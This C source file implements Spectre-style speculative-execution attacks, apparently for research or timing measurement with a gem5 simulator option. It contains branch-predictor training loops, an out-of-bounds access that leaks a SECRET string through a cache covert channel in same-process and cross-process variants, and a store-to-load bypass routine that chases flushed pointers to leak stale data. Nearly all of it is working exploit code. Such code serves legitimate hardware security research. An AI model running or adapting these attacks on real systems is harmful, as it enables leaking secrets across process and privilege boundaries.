#include "pht.h"

void train_oop(){
  for(int y = 0; y < 100; y++) {
    oop();
  }
}

void train_ip(){
  for(int y = 0; y < 10; y++) {
    access_array(0);
  }
}

__attribute__((__always_inline__)) void genPHTAtk(runData *r, memSetup *m, int *j){
  #if USE_RDTSC_BEGIN_END
      r->start = rdtsc_begin();
  #else
      r->start = rdtsc();
  #endif
  // potential out-of-bounds access
  access_array(*j);

  // only show inaccessible values (SECRET)
  if(*j >= sizeof(DATA) - 1) {
    mfence(); // avoid speculation
    #ifndef GEM5_COMPAT
      cache_decode_pretty(m->leaked, *j);
    #else
      cache_decode(m->leaked, *j);
    #endif

    #if USE_RDTSC_BEGIN_END
    r->end = rdtsc_end();
    #else
      r->end = rdtsc();
    #endif
    addOpData(r);
  }
  sched_yield(); // why is the yield necessary?
}

char accessSTL(int x){
  // store secret in data
  strcpy(data, SECRET);

  // flushing the data which is used in the condition increases
  // probability of speculation
  mfence();
  char* dat_inter = &data[0];
  char** data_slowptr = &dat_inter;
  char*** data_slowslowptr = &data_slowptr;
  mfence();
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  // ensure data is flushed at this point
  mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  (*(*data_slowslowptr))[x] = OVERWRITE;

  // data[x] should now be "#"
  // uncomment next line to break attack
  //mfence();
  // Encode stale value in the cache
  cache_encode(data[x]);
}

void sa(void (*trainer)(), runData *r, memSetup *m, int *j, pid_t pid){
  trainer();
  genPHTAtk(r,m,j);
}

void ca(void (*trainer)(), runData *r, memSetup *m, int *j, pid_t pid){
  if(pid == 0) {
    trainer();
  }
  else {
    genPHTAtk(r,m,j);
  }
}

void stl(void (*trainer)(), runData *r, memSetup *m, int *j, pid_t pid){
  #if USE_RDTSC_BEGIN_END
      r->start = rdtsc_begin();
  #else
      r->start = rdtsc();
  #endif
  // overwrite value with X, then access
  accessSTL(*j);

  mfence(); // avoid speculation
  // Recover data from covert channel
  #ifndef GEM5_COMPAT
    printf("[ ]  ");
  #endif
  #ifndef GEM5_COMPAT
      cache_decode_pretty(m->leaked, *j);
  #else
      cache_decode(m->leaked, *j);
  #endif

  #if USE_RDTSC_BEGIN_END
    r->end = rdtsc_end();
  #else
      r->end = rdtsc();
  #endif
  addOpData(r);

  sched_yield();
}
